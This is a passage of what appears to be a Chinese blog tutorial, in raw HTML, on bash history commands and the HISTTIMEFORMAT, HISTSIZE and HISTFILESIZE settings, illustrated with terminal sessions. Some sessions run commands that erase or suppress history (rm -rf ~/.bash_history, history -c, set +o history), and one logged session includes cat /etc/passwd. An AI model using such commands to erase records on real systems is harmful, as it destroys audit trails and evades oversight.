class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history | grep ls<br>    9  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  ls ~/.bash_history  -lat<br>   60  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:49:47  ls<br>   62  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:50:11  ls<br>   64  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:38   ls<br>   65  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:41  ls<br>   67  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:45  ls<br>   71  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:02  ls<br>   73  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:05  ls<br>   76  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:19  ls<br>   85  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:02  ls<br>   92  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:01:48  ls<br>   94  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:03  ls<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  106  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:22  ls<br>  107  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:34  lsls<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:46  history | grep ls<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !ls<br>lsls<br>-bash: lsls: 未找到命令<br></code></pre></td></tr></table></figure><h3 id="string-p-查找以字符串开头的最新命令"><a href="#string-p-查找以字符串开头的最新命令" class="headerlink" title="!string:p 查找以字符串开头的最新命令"></a>!string:p 查找以字符串开头的最新命令</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># !ls:p</span><br>lsls<br></code></pre></td></tr></table></figure><h3 id="string-执行包含字符串的最新命令"><a href="#string-执行包含字符串的最新命令" class="headerlink" title="!?string 执行包含字符串的最新命令"></a>!?string 执行包含字符串的最新命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 5<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:46  history | grep ls<br>  109  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:55  lsls<br>  110  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:08  pwd aaa<br>  111  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:25  pwd a23<br>  112  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:36  history 5<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !?a<br>pwd a23<br>/root<br></code></pre></td></tr></table></figure><h3 id="history-d-num-删除指定行记录"><a href="#history-d-num-删除指定行记录" class="headerlink" title="history -d num 删除指定行记录"></a>history -d num 删除指定行记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -d 2<br></code></pre></td></tr></table></figure><h3 id="history-c-清空当前用户当前终端历史记录"><a href="#history-c-清空当前用户当前终端历史记录" class="headerlink" title="history -c 清空当前用户当前终端历史记录"></a>history -c 清空当前用户当前终端历史记录</h3><p>历史记录文件.bash_history文件内容是存在的，新开终端，还是会存在之前的历史记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660663206</span><br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> /<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h3 id="history-a-追加当前终端新的历史记录到历史记录文件"><a href="#history-a-追加当前终端新的历史记录到历史记录文件" class="headerlink" title="history -a 追加当前终端新的历史记录到历史记录文件"></a>history -a 追加当前终端新的历史记录到历史记录文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">ls</span>: 无法访问test-b: 权限不够<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br></code></pre></td></tr></table></figure><h3 id="history-w-将整个历史记录写入历史记录文件"><a href="#history-w-将整个历史记录写入历史记录文件" class="headerlink" title="history -w 将整个历史记录写入历史记录文件"></a>history -w 将整个历史记录写入历史记录文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -w<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">history</span> -w<br></code></pre></td></tr></table></figure><h3 id="set-o-history-禁止记录历史记录（当前会话生效）"><a href="#set-o-history-禁止记录历史记录（当前会话生效）" class="headerlink" title="set +o history 禁止记录历史记录（当前会话生效）"></a>set +o history 禁止记录历史记录（当前会话生效）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>   17  <span class="hljs-built_in">history</span> -w<br>   18  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   19  <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">ls</span> <span class="hljs-built_in">test</span>+ohistory<br><span class="hljs-built_in">ls</span>: 无法访问<span class="hljs-built_in">test</span>+ohistory: 权限不够<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>   17  <span class="hljs-built_in">history</span> -w<br>   18  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   19  <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><h3 id="set-o-history-启动记录历史记录（当前会话生效）"><a href="#set-o-history-启动记录历史记录（当前会话生效）" class="headerlink" title="set -o history 启动记录历史记录（当前会话生效）"></a>set -o history 启动记录历史记录（当前会话生效）</h3><h2 id="history配置"><a href="#history配置" class="headerlink" title="history配置"></a>history配置</h2><h3 id="history格式配置"><a href="#history格式配置" class="headerlink" title="history格式配置"></a>history格式配置</h3><h4 id="HISTTIMEFORMAT-增加操作时间"><a href="#HISTTIMEFORMAT-增加操作时间" class="headerlink" title="HISTTIMEFORMAT 增加操作时间"></a>HISTTIMEFORMAT 增加操作时间</h4><p>export HISTTIMEFORMAT&#x3D;”%F %T “</p><p>%d 天</p><p>%m 月</p><p>%y 年</p><p>%H 小时</p><p>%M 分钟</p><p>%S 秒</p><p>%F 日期完整格式 （Y-M-D格式：2022-08-14）</p><p>%T 时间完整格式（H:M:S格式：17:15:25）</p><p>%c 日期时间完整格式（2022年08月14日 星期日 17时25分30秒）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTTIMEFORMAT</span>=<span class="hljs-string">&quot;`whoami` %c  &quot;</span><br></code></pre></td></tr></table></figure><h4 id="HISTSIZE-history命令最大显示记录命令数（也就是执行history命令显示的命令条数）"><a href="#HISTSIZE-history命令最大显示记录命令数（也就是执行history命令显示的命令条数）" class="headerlink" title="HISTSIZE history命令最大显示记录命令数（也就是执行history命令显示的命令条数）"></a>HISTSIZE history命令最大显示记录命令数（也就是执行history命令显示的命令条数）</h4><p>export HISTSIZE &#x3D; 100</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history | more<br>   19  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  history<br>   20  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  history<br>   21  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  cat /root/.bash_history<br>   22  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  cat /etc/passwd<br>   23  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  su test<br>  ......<br>  112  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:36  history 5<br>  113  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:49  pwd a23<br>  114  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:25:12  vim /etc/bashrc<br>  115  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:26:29  ls<br>  116  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:26:35  cat /etc/bashrc<br>  117  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:27:25  vim /root/.bash_history<br>  118  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:28:11  history | more<br></code></pre></td></tr></table></figure><h4 id="HISTFILESIZE-bash-history文件保存记录最大数"><a href="#HISTFILESIZE-bash-history文件保存记录最大数" class="headerlink" title="HISTFILESIZE .bash_history文件保存记录最大数"></a>HISTFILESIZE .bash_history文件保存记录最大数</h4><p>export HISTFILESIZE&#x3D;10</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">history</span><br>    1  root 2022年08月14日 星期日 17时32分30秒  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    2  root 2022年08月14日 星期日 17时32分49秒  <span class="hljs-built_in">history</span><br>    3  root 2022年08月14日 星期日 17时34分05秒  <span class="hljs-built_in">date</span><br>    4  root 2022年08月14日 星期日 17时34分38秒  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  root 2022年08月14日 星期日 17时34分42秒  <span class="hljs-built_in">history</span> -w<br>    6  root 2022年08月14日 星期日 17时36分56秒  <span class="hljs-built_in">cat</span> /root/.bash_history<br>    7  root 2022年08月14日 星期日 17时47分24秒  <span class="hljs-built_in">pwd</span><br>    8  root 2022年08月14日 星期日 17时47分28秒  <span class="hljs-built_in">ls</span> /tmp<br>    9  root 2022年08月14日 星期日 17时47分34秒  <span class="hljs-built_in">history</span><br>[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">cat</span> /root/.bash_history<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469682</span><br><span class="hljs-built_in">history</span> -w<br><span class="hljs-comment">#1660469519</span><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660469532</span><br>vim /root/.bash_history<br><span class="hljs-comment">#1660469550</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469569</span><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660469645</span><br><span class="hljs-built_in">date</span><br><span class="hljs-comment">#1660469678</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469682</span><br><span class="hljs-built_in">history</span> -w<br><span class="hljs-comment">#1660469684</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469130</span><br><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><h3 id="history配置文件"><a href="#history配置文件" class="headerlink" title="history配置文件"></a>history配置文件</h3><p>新开终端加载新的配置文件</p><h4 id="etc-bashrc-通用配置文件"><a href="#etc-bashrc-通用配置文件" class="headerlink" title="&#x2F;etc&#x2F;bashrc 通用配置文件"></a>&#x2F;etc&#x2F;bashrc 通用配置文件</h4><p>增加配置后所有用户都会生效</p><h4 id="bashrc-各用户独立配置文件，也会加载主配置文件-etc-bashrc"><a href="#bashrc-各用户独立配置文件，也会加载主配置文件-etc-bashrc" class="headerlink" title="~&#x2F;.bashrc 各用户独立配置文件，也会加载主配置文件&#x2F;etc&#x2F;bashrc"></a>~&#x2F;.bashrc 各用户独立配置文件，也会加载主配置文件&#x2F;etc&#x2F;bashrc</h4><p>root默认配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">ls</span> ~/.bashrc -l<br>-rw-r--r--. 1 root root 176 12月 29 2013 /root/.bashrc<br>[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">rm</span>=<span class="hljs-string">&#x27;rm -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cp</span>=<span class="hljs-string">&#x27;cp -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">mv</span>=<span class="hljs-string">&#x27;mv -i&#x27;</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>普通用户默认配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Uncomment the following line if you don&#x27;t like systemctl&#x27;s auto-paging feature:</span><br><span class="hljs-comment"># export SYSTEMD_PAGER=</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br></code></pre></td></tr></table></figure><p>配置示例</p><p>root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">rm</span>=<span class="hljs-string">&#x27;rm -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cp</span>=<span class="hljs-string">&#x27;cp -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">mv</span>=<span class="hljs-string">&#x27;mv -i&#x27;</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br><br>HISTTIMEFORMAT=<span class="hljs-string">&quot;%F &quot;</span><br></code></pre></td></tr></table></figure><p>root history</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history<br>    1  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 27.221.32.84 3317<br>    2  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.111 6379<br>    3  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.64 8500<br>    4  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.126.54.207 3389<br>    5  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.111 6379<br>    6  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls<br>    7  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls ~/.bashrc<br>    8  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls ~/.bashrc -l<br>    9  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> cat ~/.bashrc<br>   10  2022<span 